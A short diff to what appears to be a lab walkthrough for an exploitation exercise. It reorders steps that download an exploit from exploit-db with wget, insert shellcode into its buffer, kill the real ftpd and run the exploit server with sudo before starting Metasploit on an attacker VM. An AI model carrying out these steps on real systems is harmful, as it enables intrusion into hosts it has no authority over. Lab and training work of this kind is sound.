@@ -49,13 +49,16 @@ scp ec2-user@[your internal ip]:~/rtcp_bytecode.txt ./
 
 # download exploit server
 wget https://www.exploit-db.com/raw/44596/ > ftpexploit.py
+
 # copy rtcp_bytecode into the buf variable in ftpexploit.py
-sudo python ftpexploit.py
 
 # find and kill real ftpd
 ps aux | grep ftp 
 ls -l /proc/[PID of ftpd]/exe
 kill -15 [PID of ftpd]
+
+# run exploit server
+sudo python ftpexploit.py
 ```
 
 Start Metasploit on attacker VM
